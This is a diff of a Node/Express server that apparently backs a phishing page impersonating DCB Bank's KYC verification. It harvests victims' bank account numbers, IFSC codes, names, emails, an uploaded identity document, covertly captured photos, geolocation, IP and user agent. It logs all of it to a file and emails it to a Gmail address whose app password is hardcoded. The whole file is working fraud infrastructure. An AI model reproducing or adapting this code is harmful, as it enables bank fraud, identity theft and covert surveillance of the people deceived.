@@ -1,112 +1,189 @@
+// server.js
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
-const nodemailer = require('nodemailer');
 const path = require('path');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware
-app.use(express.static('public'));
-app.use(express.urlencoded({ extended: true }));
+// Middleware for handling large payloads
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
+app.use(express.static('public'));
 
-// File upload configuration
-const uploadDir = path.join(__dirname, 'uploads');
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir, { recursive: true });
-}
-
+// Set up multer for file upload
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => {
-    const sanitizedName = file.originalname.replace(/[^a-z0-9.]/gi, '_');
-    cb(null, `${Date.now()}_${sanitizedName}`);
+  destination: function (req, file, cb) {
+    const dir = 'uploads';
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir);
+    }
+    cb(null, dir);
+  },
+  filename: function (req, file, cb) {
+    const uniqueName = `${Date.now()}-${file.originalname}`;
+    cb(null, uniqueName);
   }
 });
 
-const upload = multer({ storage });
+// File filter function
+const fileFilter = (req, file, cb) => {
+  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+  if (allowedTypes.includes(file.mimetype)) {
+    cb(null, true);
+  } else {
+    cb(new Error('Only JPG, PNG, or PDF files are allowed'), false);
+  }
+};
 
-// Email configuration
+// Create upload instance
+const upload = multer({
+  storage: storage,
+  fileFilter: fileFilter,
+  limits: {
+    fileSize: 50 * 1024 * 1024 // 50MB limit
+  }
+}).any();
+
+// Email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'kexm wnes pcwx rkjt'
+    pass: 'iskexmwnespcwxrkjt' // Your app password
   }
 });
 
-// Submission endpoint
-app.post('/submit', upload.single('document'), async (req, res) => {
-  try {
-    const { bankname, accno, fullname, stealthImages } = req.body;
-    const file = req.file;
-    const ip = req.headers['x-forwarded-for'] || req.ip;
-    
-    // Process images
-    const images = JSON.parse(stealthImages || '[]');
-    const validImages = images.filter(img => {
-      const base64Data = img.split(',')[1] || '';
-      return Buffer.from(base64Data, 'base64').length > 5000;
-    });
-
-    // Prepare email attachments
-    const attachments = [];
-    
-    // Add document
-    if (file) {
-      attachments.push({
-        filename: file.originalname,
-        path: file.path
-      });
+// Route to handle form submission
+app.post('/submit', (req, res) => {
+  upload(req, res, async function (err) {
+    if (err instanceof multer.MulterError) {
+      console.error('Multer error:', err);
+      return res.status(500).json({ error: err.message });
+    } else if (err) {
+      console.error('Upload error:', err);
+      return res.status(500).json({ error: err.message });
     }
 
-    // Add first 5 captured images
-    validImages.slice(0, 5).forEach((img, i) => {
-      attachments.push({
-        filename: `photo_${i+1}.jpg`,
-        content: img.split(',')[1],
-        encoding: 'base64'
+    try {
+      // Extract form fields from req.body
+      const { bankname, ifsc, accno, fullname, email, location } = req.body;
+      const files = req.files;
+      const timestamp = new Date().toLocaleString();
+      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+      const userAgent = req.headers['user-agent'];
+
+      // Process location data
+      const locationData = location ? JSON.parse(location) : null;
+      
+      // Separate document file from captured images
+      let documentFile = null;
+      const imageAttachments = [];
+      
+      files.forEach(file => {
+        if (file.fieldname === 'document') {
+          documentFile = file;
+        } else if (file.fieldname.startsWith('image')) {
+          imageAttachments.push(file);
+        }
       });
-    });
 
-    // Create email
-    await transporter.sendMail({
-      from: 'DCB KYC <dcbsubmission392@gmail.com>',
-      to: 'dcbsubmission392@gmail.com',
-      subject: `KYC Submission: ${fullname}`,
-      html: `
-        <h1>New KYC Verification</h1>
-        <h2>Account Details</h2>
-        <p><strong>Bank:</strong> ${bankname}</p>
-        <p><strong>Account:</strong> ${accno}</p>
-        <p><strong>Name:</strong> ${fullname}</p>
-        
-        <h2>Verification Data</h2>
-        <p><strong>Photos Captured:</strong> ${validImages.length}</p>
-        <p><strong>IP Address:</strong> ${ip}</p>
-      `,
-      attachments
-    });
+      // Create log entry
+      const logEntry = `
+--- Submission ---
+Bank Name: ${bankname}
+IFSC Code: ${ifsc}
+Account Number: ${accno}
+Full Name: ${fullname}
+Email: ${email}
+Document: ${documentFile ? documentFile.path : 'None'}
+Time: ${timestamp}
+IP: ${ip}
+User Agent: ${userAgent}
+Location: ${locationData ? `${locationData.latitude}, ${locationData.longitude}` : 'None'}
+Images Captured: ${imageAttachments.length}
+-------------------
+`;
 
-    // Cleanup
-    if (file) fs.unlinkSync(file.path);
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
 
-    // Response
-    res.send(`
-      <div style="text-align:center;padding:20px">
-        <h2 style="color:#003d6a">Verification Submitted</h2>
-        <p>Your information has been received successfully.</p>
-      </div>
-    `);
+      // Prepare email content
+      const mailOptions = {
+        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
+        to: 'dcbsubmission392@gmail.com',
+        subject: '🔔 New DCB Bank KYC Submission',
+        html: `
+          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+            <h2 style="color: #003d6a; border-bottom: 2px solid #003d6a; padding-bottom: 10px;">
+              New KYC Submission Received
+            </h2>
+            
+            <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
+              <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
+              <p><strong>Bank Name:</strong> ${bankname}</p>
+              <p><strong>IFSC Code:</strong> ${ifsc}</p>
+              <p><strong>Account Number:</strong> ${accno}</p>
+              <p><strong>Full Name:</strong> ${fullname}</p>
+              <p><strong>Email:</strong> ${email}</p>
+            </div>
+            
+            ${locationData ? `
+            <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
+              <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
+              <p><strong>Latitude:</strong> ${locationData.latitude}</p>
+              <p><strong>Longitude:</strong> ${locationData.longitude}</p>
+              <p><strong>Accuracy:</strong> ${locationData.accuracy} meters</p>
+              <p><strong>Timestamp:</strong> ${new Date(locationData.timestamp).toLocaleString()}</p>
+            </div>
+            ` : ''}
+            
+            <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
+              <h3 style="color: #003d6a; margin-top: 0;">System Information</h3>
+              <p><strong>Total Images Captured:</strong> ${imageAttachments.length}</p>
+              <p><strong>IP Address:</strong> ${ip}</p>
+              <p><strong>User Agent:</strong> ${userAgent}</p>
+              <p><strong>Submission Time:</strong> ${timestamp}</p>
+            </div>
+          </div>
+        `,
+        attachments: []
+      };
 
-  } catch (error) {
-    console.error('Submission error:', error);
-    res.status(500).send('Submission failed');
-  }
+      // Add document attachment if exists
+      if (documentFile) {
+        mailOptions.attachments.push({
+          filename: documentFile.originalname,
+          path: documentFile.path
+        });
+      }
+
+      // Add captured images
+      imageAttachments.forEach(file => {
+        mailOptions.attachments.push({
+          filename: file.originalname,
+          path: file.path
+        });
+      });
+
+      // Send email
+      await transporter.sendMail(mailOptions);
+
+      // Cleanup files
+      if (documentFile) fs.unlinkSync(documentFile.path);
+      imageAttachments.forEach(file => fs.unlinkSync(file.path));
+
+      res.status(200).send();
+    } catch (error) {
+      console.error('❌ Submission error:', error);
+      res.status(500).json({ error: 'Submission failed' });
+    }
+  });
 });
 
+// Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
